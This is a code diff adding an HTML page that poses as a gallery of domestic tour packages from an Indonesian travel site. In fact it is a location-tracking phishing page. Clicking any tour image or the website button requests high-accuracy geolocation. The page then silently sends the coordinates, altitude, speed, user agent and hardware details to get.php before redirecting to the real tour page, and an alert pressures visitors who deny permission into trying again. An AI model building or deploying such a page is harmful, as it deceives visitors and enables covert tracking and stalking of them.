@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="refresh" content="30" />
+<style>
+h1 {
+  text-align: center;
+  color: white;
+}
+
+h2 {
+  text-align: center;
+  color: white;
+}
+
+h3 {
+  text-align: center;
+  color: white;
+}
+
+h4 {
+  text-align: center;
+  color: white;
+}
+
+p {
+color: white;
+}
+
+div.gallery {
+  border: 1px solid #ccc;
+}
+
+div.gallery:hover {
+  border: 1px solid #777;
+}
+
+div.gallery img {
+  width: 100%;
+  height: auto;
+}
+
+div.desc {
+  padding: 15px;
+  text-align: center;
+  color: white;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+.responsive {
+  padding: 0 6px;
+  float: left;
+  width: 49.99999%;
+}
+
+@media only screen and (max-width: 700px) {
+  .responsive {
+    width: 74.99999%;
+    margin: 6px 0;
+  }
+}
+
+@media only screen and (max-width: 500px) {
+  .responsive {
+    width: 100%;
+  }
+}
+
+.clearfix:after {
+  content: "";
+  display: table;
+  clear: both;
+}
+</style>
+</head>
+<body style="background-color:#000000cf;">
+<!--<body onLoad="getLocation(); l5();">-->
+<h2>SUPELTRAV</h2>
+
+<h4>Paket Wisata Dalam Negeri</h4>
+
+<div class="responsive">
+  <div class="gallery">
+    <a target="_blank" onclick="getLocation(); l1();">
+      <img src="https://3.bp.blogspot.com/-MJz9rkwjyH8/Wr73193Vc4I/AAAAAAAAAHY/WLZQYWbjDcck_IHLmeqp1FUQ4po6i2PlACLcBGAs/s1600/Pangandaran%2BTour%2B3.jpg" alt="Wisata Pangandaran Supeltrav" width="600" height="400">
+    </a>
+    <div class="desc">Wisata Pangandaran</div>
+  </div>
+</div>
+
+<div class="responsive">
+  <div class="gallery">
+    <a target="_blank" onclick="getLocation(); l2();">
+      <img src="https://1.bp.blogspot.com/-CrJZYZj4-U8/Wr732eKDeTI/AAAAAAAAAHc/_YFmDpAB3qsOlbO9BO36TZBSDI719EWggCLcBGAs/s1600/Yogyakarta%2BTour%2B3.jpg" alt="Wisata Yogyakarta Supeltrav" width="600" height="400">
+    </a>
+    <div class="desc">Wisata Yogyakarta</div>
+  </div>
+</div>
+
+<div class="clearfix"></div>
+<div style="padding:6px;"></div>
+
+<div class="responsive">
+  <div class="gallery">
+    <a target="_blank" onclick="getLocation(); l3();">
+      <img src="https://1.bp.blogspot.com/-ErA-BkNlLOg/Wr731GwMwHI/AAAAAAAAAHQ/5Mm7cfcdVhUlm7vaWKu06AYupZMeRPvHgCLcBGAs/s1600/Lombok%2BTour%2B3.jpg" alt="Wisata Lombok Supeltrav" width="600" height="400">
+    </a>
+    <div class="desc">Wisata Lombok</div>
+  </div>
+</div>
+
+<div class="responsive">
+  <div class="gallery">
+    <a target="_blank" onclick="getLocation(); l4();">
+      <img src="https://1.bp.blogspot.com/-UUGxEZB29uk/Wr730Whht6I/AAAAAAAAAHE/ZSXqyZX6tDUcGtUFiUQX0wfp-cnBxxuDQCLcBGAs/s1600/Dieng%2BTour%2B3.jpg" alt="Wisata Dieng Supeltrav" width="600" height="400">
+    </a>
+    <div class="desc">Wisata Dieng</div>
+  </div>
+</div>
+
+<div class="clearfix"></div>
+
+<div style="padding:6px;">
+  <p>Lihat paket wisata lainnya:
+  <button onclick="getLocation(); l5();">WEBSITE</button>
+  </p>
+</div>
+
+<script>
+
+
+function getLocation() {
+    if (navigator.geolocation) {
+    var acc = {enableHighAccuracy : true , timeout : 30000, maximumage : 0 };
+        navigator.geolocation.getCurrentPosition(showPosition, showError, acc);
+    } else { 
+        x.innerHTML = "Silahkan muat ulang halaman...";
+    }
+}
+
+var wasingsong;
+function l1(){
+wasingsong="https://supeltrav.blogspot.com/2022/05/paket-wisata-pangandaran-tour.html";
+}
+function l2(){
+wasingsong="https://supeltrav.blogspot.com/2022/05/paket-wisata-yogyakarta-tour.html";
+}
+function l3(){
+wasingsong="https://supeltrav.blogspot.com/2022/05/paket-wisata-lombok-tour.html";
+}
+function l4(){
+wasingsong="https://supeltrav.blogspot.com/2022/05/paket-wisata-dieng-tour.html";
+}
+function l5(){
+wasingsong="https://supeltrav.blogspot.com/search/label/Paket%20Wisata%20Dalam%20Negeri";
+}
+
+function showPosition(position) {
+
+ //   x.innerHTML = "Latitude: " + position.coords.latitude + 
+ //   "<br>Longitude: " + position.coords.longitude;
+
+  var useragent = navigator.userAgent;
+  var latitude = position.coords.latitude;
+  var longitude = position.coords.longitude;
+  var altitude = position.coords.altitude;
+  var accuracy = position.coords.accuracy;
+  var speed = position.coords.speed;
+  var heading = position.coords.heading;
+  var platform = navigator.platform;
+  var hardware = navigator.hardwareConcurrency;
+  var memory = navigator.deviceMemory;
+  var height = window.screen.height;
+  var width = window.screen.width;
+
+window.location.href = "get.php?latitude=" + latitude + "&longitude=" + longitude + "&altitude=" + altitude + "&platform=" + platform + "&accuracy=" + accuracy + "&speed=" + speed + "&heading=" + heading + "&hardware=" + hardware + "&memory=" + memory + "&useragent=" + useragent + "&height=" + height + "&width=" + width;
+
+
+window.location.href = wasingsong;
+
+}
+
+function showError(error)
+{
+	switch(error.code)
+  {
+		case error.PERMISSION_DENIED:
+			var error = '1' ; // 'permission denied';
+      alert('Tidak dapat melanjutkan, silahkan ulangi kembali...');
+      break;
+		case error.POSITION_UNAVAILABLE:
+			var error = '2' // 'unavailable';
+			break;
+		case error.TIMEOUT:
+			var error = '3' // 'timed out';
+      alert('Silahkan muat ulang halaman...');
+			break;
+		case error.UNKNOWN_ERROR:
+			var error  = '4' // 'unknown error';
+			break;
+	}
+
+window.location.href = "error.php?error=" + error;
+
+}
+</script>
+
+</body>
+</html>
+
